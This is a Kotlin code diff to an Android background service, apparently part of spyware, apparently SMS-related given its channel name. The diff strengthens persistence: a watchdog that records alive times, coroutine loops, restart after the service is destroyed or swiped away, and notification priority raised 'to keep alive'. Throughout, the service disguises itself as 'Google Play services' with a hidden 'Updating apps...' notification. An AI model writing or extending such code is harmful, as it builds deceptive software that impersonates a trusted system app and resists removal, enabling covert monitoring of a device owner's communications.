@@ -8,12 +8,13 @@ import android.net.Network
 import android.net.NetworkCapabilities
 import android.net.NetworkRequest
 import android.os.Build
-import android.os.Handler
 import android.os.IBinder
-import android.os.Looper
+import android.os.SystemClock
 import android.provider.Settings
 import android.util.Log
 import androidx.core.app.NotificationCompat
+import com.example.test.utils.UnifiedWatchdogScheduler
+import kotlinx.coroutines.*
 import org.json.JSONObject
 import java.net.HttpURLConnection
 import java.net.URL
@@ -21,16 +22,33 @@ import java.net.URL
 class NetworkService : Service() {
 
     companion object {
+        @Volatile var isRunning = false
+        
         private const val TAG = "NetworkService"
         private const val NOTIFICATION_ID = 1
         private const val CHANNEL_ID = "sms_service_channel"
         private const val CHECK_INTERVAL_MS = 10000L
+        
+        private const val PREF = "service_alive"
+        private const val KEY_LAST_ALIVE = "last_alive_NetworkService"
+        
+        fun markAlive(ctx: Context) {
+            ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE)
+                .edit().putLong(KEY_LAST_ALIVE, SystemClock.elapsedRealtime()).apply()
+        }
+        
+        fun lastAlive(ctx: Context): Long =
+            ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE).getLong(KEY_LAST_ALIVE, 0L)
     }
 
     private lateinit var connectivityManager: ConnectivityManager
     private var isCallbackRegistered = false
     private var lastOnlineState: Boolean? = null
-    private val handler = Handler(Looper.getMainLooper())
+    private var cleanupJob: Job? = null
+    
+    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO + CoroutineExceptionHandler { _, t ->
+        Log.e(TAG, "Coroutine error: ${t.message}", t)
+    })
 
     private val networkCallback = object : ConnectivityManager.NetworkCallback() {
         override fun onAvailable(network: Network) {
@@ -46,10 +64,13 @@ class NetworkService : Service() {
         }
     }
 
-    private val periodicChecker = object : Runnable {
-        override fun run() {
-            checkAndUpdateStatus()
-            handler.postDelayed(this, CHECK_INTERVAL_MS)
+    private fun startPeriodicChecker() {
+        serviceScope.launch {
+            while (isActive) {
+                markAlive(applicationContext)
+                checkAndUpdateStatus()
+                delay(CHECK_INTERVAL_MS)
+            }
         }
     }
 
@@ -58,11 +79,31 @@ class NetworkService : Service() {
         connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
         startForegroundWithNotification()
         registerNetworkCallback()
+        startCleanupLoop()
+        startPeriodicChecker()
         checkAndUpdateStatus()
-        handler.post(periodicChecker)
+    }
+    
+    private fun startCleanupLoop() {
+        cleanupJob = serviceScope.launch {
+            while (isActive) {
+                delay(10 * 60 * 1000L) // Every 10 minutes
+                val rt = Runtime.getRuntime()
+                val usedMB = (rt.totalMemory() - rt.freeMemory()) / 1024 / 1024
+                if (usedMB > 120) {
+                    runCatching { cacheDir.deleteRecursively() }
+                }
+            }
+        }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        if (isRunning) {
+            Log.d(TAG, "Already running, skip duplicate start")
+            return START_STICKY
+        }
+        isRunning = true
+        
         if (!isCallbackRegistered) {
             registerNetworkCallback()
         }
@@ -79,7 +120,7 @@ class NetworkService : Service() {
             .setContentTitle("Google Play services")
             .setContentText("Updating apps...")
             .setSmallIcon(android.R.drawable.stat_notify_sync)
-            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setPriority(NotificationCompat.PRIORITY_DEFAULT) // 🔹 not too low
             .setOngoing(true)
             .setShowWhen(false)
             .setVisibility(NotificationCompat.VISIBILITY_SECRET)
@@ -99,7 +140,7 @@ class NetworkService : Service() {
             val channel = NotificationChannel(
                 CHANNEL_ID,
                 "Google Play services",
-                NotificationManager.IMPORTANCE_MIN
+                NotificationManager.IMPORTANCE_LOW // 🔹 higher than MIN to keep alive
             ).apply {
                 description = "Google Play services keeps your apps up to date"
                 setShowBadge(false)
@@ -219,14 +260,25 @@ class NetworkService : Service() {
 
     override fun onDestroy() {
         super.onDestroy()
+        isRunning = false
         unregisterNetworkCallback()
-        handler.removeCallbacks(periodicChecker)
-
-        val restartIntent = Intent(applicationContext, NetworkService::class.java)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            applicationContext.startForegroundService(restartIntent)
-        } else {
-            applicationContext.startService(restartIntent)
+        
+        serviceScope.launch {
+            cleanup()
+            UnifiedWatchdogScheduler.kickNow(applicationContext)
         }
+    }
+    
+    override fun onTaskRemoved(rootIntent: Intent?) {
+        serviceScope.launch {
+            cleanup()
+            UnifiedWatchdogScheduler.kickNow(applicationContext)
+        }
+    }
+    
+    private suspend fun cleanup() = withContext(Dispatchers.IO) {
+        cleanupJob?.cancel()
+        serviceScope.coroutineContext.cancelChildren()
+        Log.d(TAG, "Service cleaned up")
     }
 }
